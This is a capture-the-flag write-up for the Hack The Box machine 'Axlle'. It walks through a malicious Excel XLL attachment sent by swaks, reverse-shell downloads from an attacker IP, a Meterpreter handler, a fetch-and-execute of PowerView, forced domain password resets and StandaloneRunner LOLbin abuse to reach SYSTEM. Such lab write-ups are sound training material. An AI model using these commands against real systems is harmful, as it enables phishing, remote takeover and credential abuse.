---
title: axlle
published: 2024-10-09
description: 'Axlle HTB hard machine writeup'
tags: [HTB, AD, Machines]
category: 'Machines'
image: ../../assets/axlle/Axlle.png
draft: false 
lang: 'en'
---


As the machine's name hinted, this is about xll files, which are like DLL files but for excel and we gonna use this extension to execute code on the victim machine once he opens it

# 1) write .xll file and upload it using swax

us the c code from https://swisskyrepo.github.io/InternalAllTheThings/redteam/access/office-attacks/#xll-exec to generate an malicious .xll file

```c
#include <Windows.h>

__declspec(dllexport) void __cdecl xlAutoOpen(void); 

void __cdecl xlAutoOpen() {
    // Triggers when Excel opens
    WinExec("cmd.exe /c notepad.exe", 1);
}

BOOL APIENTRY DllMain( HMODULE hModule,
                    DWORD  ul_reason_for_call,
                    LPVOID lpReserved
                    )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
```

compile it with the following command:
```bash
x86_64-w64-mingw32-gcc snippet.c 2013_Office_System_Developer_Resources/Excel2013XLLSDK/LIB/x64/XLCALL32.LIB -o importantdoc.xll -s -Os -DUNICODE -shared -I 2013_Office_System_Developer_Resources/Excel2013XLLSDK/INCLUDE/
```

here of course you will need to install `x86_64-w64-mingw32-gcc ` and download the Excel SDK


then lets send this malicious file to the victim in an email using swaks
```bash
swaks \          
        --from accounts@axlle.htb \
        --to accounts@axlle.htb \
        --server axlle.htb \
        --port 25 \
        --header 'Subject: Test email' \
        --body "This email contains an attachment." \
        --attach '@importantdoc.xll'
```


# 2) write the revershell.exe and .link on the smb folder to get shell

```powershell
wget http://10.10.14.135:3030/reverse.exe -o reverse.exe
```

```bash
msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost 0.0.0.0; set lport 4444; exploit"
```


```powershell
$obj = New-object -comobject wscript.shell
$link = $obj.createshortcut("C:\inetpub\testing\scam.url")
$link.targetpath = "C:\inetpub\testing\reverse.exe"
$link.save()
```

# 3) forceChangePassword

now we have reverse shell as `dallon.matrix` and have right to change `baz.humphries` and `jacob.greeny` passwords

![](src/assets/axlle/Axlle_image_1.png)

get the powerview first

```powershell
(New-Object System.Net.WebClient).DownloadString("http://10.10.14.135:3030/powerview.ps1") | iex
```


```powershell
$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
```

```powershell
Set-DomainUserPassword -Identity baz.humphries -AccountPassword $UserPassword
Set-DomainUserPassword -Identity jacob.greeny -AccountPassword $UserPassword
```

now both those accounts have  `Password123!` as password


#### to get a reverse shell as one of those users

```powershell
./RunasCs.exe "baz.humphries" "Password123!" powershell -r 10.10.14.135:2222 --bypass-uac --logon-type '8'
```

# after we have the baz.humphries we need to exploit the standalone vulnerability

in the `c:\App developement\kbfiltr\README.md` it says that the `C:\Program Files (x86)\Windows Kits\10\Testing\StandaloneTesting\Internal\x64\standalonerunner.exe` is executed regularly by the SYSTEM user

and looking at the `C:\Program Files (x86)\Windows Kits\10\Testing\StandaloneTesting\Internal\` we see that we (`APP DEV`) group have write access on the `x64`directory 
```powershell
PS C:\Program Files (x86)\Windows Kits\10\Testing\StandaloneTesting\Internal> icacls x64
x64 AXLLE\App Devs:(OI)(CI)(RX,W)
    Everyone:(I)(OI)(CI)(R)
	....
	APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(OI)(CI)(IO)(GR,GE)
```

googling about the `standalonerunner.exe` we find that this is a LOLbin and we can exploit it if we have write access on the running directory of that exe

https://github.com/nasbench/Misc-Research/blob/main/LOLBINs/StandaloneRunner.md#putting-everything-together

on our machine:
```bash
nc -nlvp 6666
```

on the target host:

download our needed files in the `c:\inetpub\testing` as the user `dallon.matrix` 
```bash
wget http://10.10.14.135:3030/command.txt -o command.txt
wget http://10.10.14.135:3030/reboot.rsf -o reboot.rsf
```


```powershell
cp c:\inetpub\testing\reboot.rsf reboot.rsf;

mkdir myTestDir;cd myTestDir;mkdir working;cd ../ 
new-item rsf.rsf -type file; mv rsf.rsf myTestDir\working

cp c:\inetpub\testing\command.txt command.txt
```

and then get the flag

# GG
